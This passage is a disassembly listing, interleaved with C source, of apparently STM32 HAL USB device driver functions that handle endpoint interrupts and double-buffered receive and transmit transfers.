 8002cb0:	2b00      	cmp	r3, #0
 8002cb2:	d126      	bne.n	8002d02 <PCD_EP_ISR_Handler+0x5f8>
 8002cb4:	687b      	ldr	r3, [r7, #4]
 8002cb6:	681b      	ldr	r3, [r3, #0]
 8002cb8:	627b      	str	r3, [r7, #36]	; 0x24
 8002cba:	687b      	ldr	r3, [r7, #4]
 8002cbc:	681b      	ldr	r3, [r3, #0]
 8002cbe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002cc2:	b29b      	uxth	r3, r3
 8002cc4:	461a      	mov	r2, r3
 8002cc6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002cc8:	4413      	add	r3, r2
 8002cca:	627b      	str	r3, [r7, #36]	; 0x24
 8002ccc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cce:	781b      	ldrb	r3, [r3, #0]
 8002cd0:	00da      	lsls	r2, r3, #3
 8002cd2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002cd4:	4413      	add	r3, r2
 8002cd6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002cda:	623b      	str	r3, [r7, #32]
 8002cdc:	6a3b      	ldr	r3, [r7, #32]
 8002cde:	881b      	ldrh	r3, [r3, #0]
 8002ce0:	b29b      	uxth	r3, r3
 8002ce2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ce6:	b29a      	uxth	r2, r3
 8002ce8:	6a3b      	ldr	r3, [r7, #32]
 8002cea:	801a      	strh	r2, [r3, #0]
 8002cec:	6a3b      	ldr	r3, [r7, #32]
 8002cee:	881b      	ldrh	r3, [r3, #0]
 8002cf0:	b29b      	uxth	r3, r3
 8002cf2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002cf6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002cfa:	b29a      	uxth	r2, r3
 8002cfc:	6a3b      	ldr	r3, [r7, #32]
 8002cfe:	801a      	strh	r2, [r3, #0]
 8002d00:	e061      	b.n	8002dc6 <PCD_EP_ISR_Handler+0x6bc>
 8002d02:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d04:	785b      	ldrb	r3, [r3, #1]
 8002d06:	2b01      	cmp	r3, #1
 8002d08:	d15d      	bne.n	8002dc6 <PCD_EP_ISR_Handler+0x6bc>
 8002d0a:	687b      	ldr	r3, [r7, #4]
 8002d0c:	681b      	ldr	r3, [r3, #0]
 8002d0e:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002d10:	687b      	ldr	r3, [r7, #4]
 8002d12:	681b      	ldr	r3, [r3, #0]
 8002d14:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002d18:	b29b      	uxth	r3, r3
 8002d1a:	461a      	mov	r2, r3
 8002d1c:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002d1e:	4413      	add	r3, r2
 8002d20:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002d22:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d24:	781b      	ldrb	r3, [r3, #0]
 8002d26:	00da      	lsls	r2, r3, #3
 8002d28:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002d2a:	4413      	add	r3, r2
 8002d2c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002d30:	62bb      	str	r3, [r7, #40]	; 0x28
 8002d32:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002d34:	2200      	movs	r2, #0
 8002d36:	801a      	strh	r2, [r3, #0]
 8002d38:	e045      	b.n	8002dc6 <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002d3a:	687b      	ldr	r3, [r7, #4]
 8002d3c:	681b      	ldr	r3, [r3, #0]
 8002d3e:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002d40:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d42:	785b      	ldrb	r3, [r3, #1]
 8002d44:	2b00      	cmp	r3, #0
 8002d46:	d126      	bne.n	8002d96 <PCD_EP_ISR_Handler+0x68c>
 8002d48:	687b      	ldr	r3, [r7, #4]
 8002d4a:	681b      	ldr	r3, [r3, #0]
 8002d4c:	637b      	str	r3, [r7, #52]	; 0x34
 8002d4e:	687b      	ldr	r3, [r7, #4]
 8002d50:	681b      	ldr	r3, [r3, #0]
 8002d52:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002d56:	b29b      	uxth	r3, r3
 8002d58:	461a      	mov	r2, r3
 8002d5a:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002d5c:	4413      	add	r3, r2
 8002d5e:	637b      	str	r3, [r7, #52]	; 0x34
 8002d60:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d62:	781b      	ldrb	r3, [r3, #0]
 8002d64:	00da      	lsls	r2, r3, #3
 8002d66:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002d68:	4413      	add	r3, r2
 8002d6a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002d6e:	633b      	str	r3, [r7, #48]	; 0x30
 8002d70:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002d72:	881b      	ldrh	r3, [r3, #0]
 8002d74:	b29b      	uxth	r3, r3
 8002d76:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002d7a:	b29a      	uxth	r2, r3
 8002d7c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002d7e:	801a      	strh	r2, [r3, #0]
 8002d80:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002d82:	881b      	ldrh	r3, [r3, #0]
 8002d84:	b29b      	uxth	r3, r3
 8002d86:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002d8a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002d8e:	b29a      	uxth	r2, r3
 8002d90:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002d92:	801a      	strh	r2, [r3, #0]
 8002d94:	e017      	b.n	8002dc6 <PCD_EP_ISR_Handler+0x6bc>
 8002d96:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d98:	785b      	ldrb	r3, [r3, #1]
 8002d9a:	2b01      	cmp	r3, #1
 8002d9c:	d113      	bne.n	8002dc6 <PCD_EP_ISR_Handler+0x6bc>
 8002d9e:	687b      	ldr	r3, [r7, #4]
 8002da0:	681b      	ldr	r3, [r3, #0]
 8002da2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002da6:	b29b      	uxth	r3, r3
 8002da8:	461a      	mov	r2, r3
 8002daa:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002dac:	4413      	add	r3, r2
 8002dae:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002db0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002db2:	781b      	ldrb	r3, [r3, #0]
 8002db4:	00da      	lsls	r2, r3, #3
 8002db6:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002db8:	4413      	add	r3, r2
 8002dba:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002dbe:	63bb      	str	r3, [r7, #56]	; 0x38
 8002dc0:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002dc2:	2200      	movs	r2, #0
 8002dc4:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002dc6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002dc8:	781b      	ldrb	r3, [r3, #0]
 8002dca:	4619      	mov	r1, r3
 8002dcc:	6878      	ldr	r0, [r7, #4]
 8002dce:	f009 fe7c 	bl	800caca <HAL_PCD_DataInStageCallback>
 8002dd2:	e051      	b.n	8002e78 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002dd4:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002dd8:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002ddc:	2b00      	cmp	r3, #0
 8002dde:	d144      	bne.n	8002e6a <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002de0:	687b      	ldr	r3, [r7, #4]
 8002de2:	681b      	ldr	r3, [r3, #0]
 8002de4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002de8:	b29b      	uxth	r3, r3
 8002dea:	461a      	mov	r2, r3
 8002dec:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002dee:	781b      	ldrb	r3, [r3, #0]
 8002df0:	00db      	lsls	r3, r3, #3
 8002df2:	4413      	add	r3, r2
 8002df4:	687a      	ldr	r2, [r7, #4]
 8002df6:	6812      	ldr	r2, [r2, #0]
 8002df8:	4413      	add	r3, r2
 8002dfa:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002dfe:	881b      	ldrh	r3, [r3, #0]
 8002e00:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002e04:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002e08:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e0a:	699a      	ldr	r2, [r3, #24]
 8002e0c:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002e10:	429a      	cmp	r2, r3
 8002e12:	d907      	bls.n	8002e24 <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002e14:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e16:	699a      	ldr	r2, [r3, #24]
 8002e18:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002e1c:	1ad2      	subs	r2, r2, r3
 8002e1e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e20:	619a      	str	r2, [r3, #24]
 8002e22:	e002      	b.n	8002e2a <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
 8002e24:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e26:	2200      	movs	r2, #0
 8002e28:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002e2a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e2c:	699b      	ldr	r3, [r3, #24]
 8002e2e:	2b00      	cmp	r3, #0
 8002e30:	d106      	bne.n	8002e40 <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002e32:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e34:	781b      	ldrb	r3, [r3, #0]
 8002e36:	4619      	mov	r1, r3
 8002e38:	6878      	ldr	r0, [r7, #4]
 8002e3a:	f009 fe46 	bl	800caca <HAL_PCD_DataInStageCallback>
 8002e3e:	e01b      	b.n	8002e78 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
 8002e40:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e42:	695a      	ldr	r2, [r3, #20]
 8002e44:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002e48:	441a      	add	r2, r3
 8002e4a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e4c:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002e4e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e50:	69da      	ldr	r2, [r3, #28]
 8002e52:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002e56:	441a      	add	r2, r3
 8002e58:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e5a:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002e5c:	687b      	ldr	r3, [r7, #4]
 8002e5e:	681b      	ldr	r3, [r3, #0]
 8002e60:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002e62:	4618      	mov	r0, r3
 8002e64:	f003 fec3 	bl	8006bee <USB_EPStartXfer>
 8002e68:	e006      	b.n	8002e78 <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002e6a:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002e6e:	461a      	mov	r2, r3
 8002e70:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002e72:	6878      	ldr	r0, [r7, #4]
 8002e74:	f000 f917 	bl	80030a6 <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002e78:	687b      	ldr	r3, [r7, #4]
 8002e7a:	681b      	ldr	r3, [r3, #0]
 8002e7c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002e80:	b29b      	uxth	r3, r3
 8002e82:	b21b      	sxth	r3, r3
 8002e84:	2b00      	cmp	r3, #0
 8002e86:	f6ff ac45 	blt.w	8002714 <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002e8a:	2300      	movs	r3, #0
}
 8002e8c:	4618      	mov	r0, r3
 8002e8e:	3758      	adds	r7, #88	; 0x58
 8002e90:	46bd      	mov	sp, r7
 8002e92:	bd80      	pop	{r7, pc}

08002e94 <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002e94:	b580      	push	{r7, lr}
 8002e96:	b088      	sub	sp, #32
 8002e98:	af00      	add	r7, sp, #0
 8002e9a:	60f8      	str	r0, [r7, #12]
 8002e9c:	60b9      	str	r1, [r7, #8]
 8002e9e:	4613      	mov	r3, r2
 8002ea0:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002ea2:	88fb      	ldrh	r3, [r7, #6]
 8002ea4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002ea8:	2b00      	cmp	r3, #0
 8002eaa:	d07c      	beq.n	8002fa6 <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002eac:	68fb      	ldr	r3, [r7, #12]
 8002eae:	681b      	ldr	r3, [r3, #0]
 8002eb0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002eb4:	b29b      	uxth	r3, r3
 8002eb6:	461a      	mov	r2, r3
 8002eb8:	68bb      	ldr	r3, [r7, #8]
 8002eba:	781b      	ldrb	r3, [r3, #0]
 8002ebc:	00db      	lsls	r3, r3, #3
 8002ebe:	4413      	add	r3, r2
 8002ec0:	68fa      	ldr	r2, [r7, #12]
 8002ec2:	6812      	ldr	r2, [r2, #0]
 8002ec4:	4413      	add	r3, r2
 8002ec6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002eca:	881b      	ldrh	r3, [r3, #0]
 8002ecc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ed0:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002ed2:	68bb      	ldr	r3, [r7, #8]
 8002ed4:	699a      	ldr	r2, [r3, #24]
 8002ed6:	8b7b      	ldrh	r3, [r7, #26]
 8002ed8:	429a      	cmp	r2, r3
 8002eda:	d306      	bcc.n	8002eea <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002edc:	68bb      	ldr	r3, [r7, #8]
 8002ede:	699a      	ldr	r2, [r3, #24]
 8002ee0:	8b7b      	ldrh	r3, [r7, #26]
 8002ee2:	1ad2      	subs	r2, r2, r3
 8002ee4:	68bb      	ldr	r3, [r7, #8]
 8002ee6:	619a      	str	r2, [r3, #24]
 8002ee8:	e002      	b.n	8002ef0 <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002eea:	68bb      	ldr	r3, [r7, #8]
 8002eec:	2200      	movs	r2, #0
 8002eee:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002ef0:	68bb      	ldr	r3, [r7, #8]
 8002ef2:	699b      	ldr	r3, [r3, #24]
 8002ef4:	2b00      	cmp	r3, #0
 8002ef6:	d123      	bne.n	8002f40 <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002ef8:	68fb      	ldr	r3, [r7, #12]
 8002efa:	681b      	ldr	r3, [r3, #0]
 8002efc:	461a      	mov	r2, r3
 8002efe:	68bb      	ldr	r3, [r7, #8]
 8002f00:	781b      	ldrb	r3, [r3, #0]
 8002f02:	009b      	lsls	r3, r3, #2
 8002f04:	4413      	add	r3, r2
 8002f06:	881b      	ldrh	r3, [r3, #0]
 8002f08:	b29b      	uxth	r3, r3
 8002f0a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002f0e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002f12:	833b      	strh	r3, [r7, #24]
 8002f14:	8b3b      	ldrh	r3, [r7, #24]
 8002f16:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002f1a:	833b      	strh	r3, [r7, #24]
 8002f1c:	68fb      	ldr	r3, [r7, #12]
 8002f1e:	681b      	ldr	r3, [r3, #0]
 8002f20:	461a      	mov	r2, r3
 8002f22:	68bb      	ldr	r3, [r7, #8]
 8002f24:	781b      	ldrb	r3, [r3, #0]
 8002f26:	009b      	lsls	r3, r3, #2
 8002f28:	441a      	add	r2, r3
 8002f2a:	8b3b      	ldrh	r3, [r7, #24]
 8002f2c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002f30:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002f34:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002f38:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002f3c:	b29b      	uxth	r3, r3
 8002f3e:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002f40:	88fb      	ldrh	r3, [r7, #6]
 8002f42:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002f46:	2b00      	cmp	r3, #0
 8002f48:	d01f      	beq.n	8002f8a <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002f4a:	68fb      	ldr	r3, [r7, #12]
 8002f4c:	681b      	ldr	r3, [r3, #0]
 8002f4e:	461a      	mov	r2, r3
 8002f50:	68bb      	ldr	r3, [r7, #8]
 8002f52:	781b      	ldrb	r3, [r3, #0]
 8002f54:	009b      	lsls	r3, r3, #2
 8002f56:	4413      	add	r3, r2
 8002f58:	881b      	ldrh	r3, [r3, #0]
 8002f5a:	b29b      	uxth	r3, r3
 8002f5c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002f60:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002f64:	82fb      	strh	r3, [r7, #22]
 8002f66:	68fb      	ldr	r3, [r7, #12]
 8002f68:	681b      	ldr	r3, [r3, #0]
 8002f6a:	461a      	mov	r2, r3
 8002f6c:	68bb      	ldr	r3, [r7, #8]
 8002f6e:	781b      	ldrb	r3, [r3, #0]
 8002f70:	009b      	lsls	r3, r3, #2
 8002f72:	441a      	add	r2, r3
 8002f74:	8afb      	ldrh	r3, [r7, #22]
 8002f76:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002f7a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002f7e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002f82:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002f86:	b29b      	uxth	r3, r3
 8002f88:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002f8a:	8b7b      	ldrh	r3, [r7, #26]
 8002f8c:	2b00      	cmp	r3, #0
 8002f8e:	f000 8085 	beq.w	800309c <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002f92:	68fb      	ldr	r3, [r7, #12]
 8002f94:	6818      	ldr	r0, [r3, #0]
 8002f96:	68bb      	ldr	r3, [r7, #8]
 8002f98:	6959      	ldr	r1, [r3, #20]
 8002f9a:	68bb      	ldr	r3, [r7, #8]
 8002f9c:	891a      	ldrh	r2, [r3, #8]
 8002f9e:	8b7b      	ldrh	r3, [r7, #26]
 8002fa0:	f005 fb73 	bl	800868a <USB_ReadPMA>
 8002fa4:	e07a      	b.n	800309c <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002fa6:	68fb      	ldr	r3, [r7, #12]
 8002fa8:	681b      	ldr	r3, [r3, #0]
 8002faa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002fae:	b29b      	uxth	r3, r3
 8002fb0:	461a      	mov	r2, r3
 8002fb2:	68bb      	ldr	r3, [r7, #8]
 8002fb4:	781b      	ldrb	r3, [r3, #0]
 8002fb6:	00db      	lsls	r3, r3, #3
 8002fb8:	4413      	add	r3, r2
 8002fba:	68fa      	ldr	r2, [r7, #12]
 8002fbc:	6812      	ldr	r2, [r2, #0]
 8002fbe:	4413      	add	r3, r2
 8002fc0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002fc4:	881b      	ldrh	r3, [r3, #0]
 8002fc6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002fca:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002fcc:	68bb      	ldr	r3, [r7, #8]
 8002fce:	699a      	ldr	r2, [r3, #24]
 8002fd0:	8b7b      	ldrh	r3, [r7, #26]
 8002fd2:	429a      	cmp	r2, r3
 8002fd4:	d306      	bcc.n	8002fe4 <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 8002fd6:	68bb      	ldr	r3, [r7, #8]
 8002fd8:	699a      	ldr	r2, [r3, #24]
 8002fda:	8b7b      	ldrh	r3, [r7, #26]
 8002fdc:	1ad2      	subs	r2, r2, r3
 8002fde:	68bb      	ldr	r3, [r7, #8]
 8002fe0:	619a      	str	r2, [r3, #24]
 8002fe2:	e002      	b.n	8002fea <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 8002fe4:	68bb      	ldr	r3, [r7, #8]
 8002fe6:	2200      	movs	r2, #0
 8002fe8:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002fea:	68bb      	ldr	r3, [r7, #8]
 8002fec:	699b      	ldr	r3, [r3, #24]
 8002fee:	2b00      	cmp	r3, #0
 8002ff0:	d123      	bne.n	800303a <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002ff2:	68fb      	ldr	r3, [r7, #12]
 8002ff4:	681b      	ldr	r3, [r3, #0]
 8002ff6:	461a      	mov	r2, r3
 8002ff8:	68bb      	ldr	r3, [r7, #8]
 8002ffa:	781b      	ldrb	r3, [r3, #0]
 8002ffc:	009b      	lsls	r3, r3, #2
 8002ffe:	4413      	add	r3, r2
 8003000:	881b      	ldrh	r3, [r3, #0]
 8003002:	b29b      	uxth	r3, r3
 8003004:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8003008:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800300c:	83fb      	strh	r3, [r7, #30]
 800300e:	8bfb      	ldrh	r3, [r7, #30]
 8003010:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8003014:	83fb      	strh	r3, [r7, #30]
 8003016:	68fb      	ldr	r3, [r7, #12]
 8003018:	681b      	ldr	r3, [r3, #0]
 800301a:	461a      	mov	r2, r3
 800301c:	68bb      	ldr	r3, [r7, #8]
 800301e:	781b      	ldrb	r3, [r3, #0]
 8003020:	009b      	lsls	r3, r3, #2
 8003022:	441a      	add	r2, r3
 8003024:	8bfb      	ldrh	r3, [r7, #30]
 8003026:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800302a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800302e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003032:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003036:	b29b      	uxth	r3, r3
 8003038:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 800303a:	88fb      	ldrh	r3, [r7, #6]
 800303c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8003040:	2b00      	cmp	r3, #0
 8003042:	d11f      	bne.n	8003084 <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8003044:	68fb      	ldr	r3, [r7, #12]
 8003046:	681b      	ldr	r3, [r3, #0]
 8003048:	461a      	mov	r2, r3
 800304a:	68bb      	ldr	r3, [r7, #8]
 800304c:	781b      	ldrb	r3, [r3, #0]
 800304e:	009b      	lsls	r3, r3, #2
 8003050:	4413      	add	r3, r2
 8003052:	881b      	ldrh	r3, [r3, #0]
 8003054:	b29b      	uxth	r3, r3
 8003056:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800305a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800305e:	83bb      	strh	r3, [r7, #28]
 8003060:	68fb      	ldr	r3, [r7, #12]
 8003062:	681b      	ldr	r3, [r3, #0]
 8003064:	461a      	mov	r2, r3
 8003066:	68bb      	ldr	r3, [r7, #8]
 8003068:	781b      	ldrb	r3, [r3, #0]
 800306a:	009b      	lsls	r3, r3, #2
 800306c:	441a      	add	r2, r3
 800306e:	8bbb      	ldrh	r3, [r7, #28]
 8003070:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003074:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003078:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800307c:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8003080:	b29b      	uxth	r3, r3
 8003082:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8003084:	8b7b      	ldrh	r3, [r7, #26]
 8003086:	2b00      	cmp	r3, #0
 8003088:	d008      	beq.n	800309c <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 800308a:	68fb      	ldr	r3, [r7, #12]
 800308c:	6818      	ldr	r0, [r3, #0]
 800308e:	68bb      	ldr	r3, [r7, #8]
 8003090:	6959      	ldr	r1, [r3, #20]
 8003092:	68bb      	ldr	r3, [r7, #8]
 8003094:	895a      	ldrh	r2, [r3, #10]
 8003096:	8b7b      	ldrh	r3, [r7, #26]
 8003098:	f005 faf7 	bl	800868a <USB_ReadPMA>
    }
  }

  return count;
 800309c:	8b7b      	ldrh	r3, [r7, #26]
}
 800309e:	4618      	mov	r0, r3
 80030a0:	3720      	adds	r7, #32
 80030a2:	46bd      	mov	sp, r7
 80030a4:	bd80      	pop	{r7, pc}

080030a6 <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 80030a6:	b580      	push	{r7, lr}
 80030a8:	b0a4      	sub	sp, #144	; 0x90
 80030aa:	af00      	add	r7, sp, #0
 80030ac:	60f8      	str	r0, [r7, #12]
 80030ae:	60b9      	str	r1, [r7, #8]
 80030b0:	4613      	mov	r3, r2
 80030b2:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 80030b4:	88fb      	ldrh	r3, [r7, #6]
 80030b6:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80030ba:	2b00      	cmp	r3, #0
 80030bc:	f000 81db 	beq.w	8003476 <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 80030c0:	68fb      	ldr	r3, [r7, #12]
 80030c2:	681b      	ldr	r3, [r3, #0]
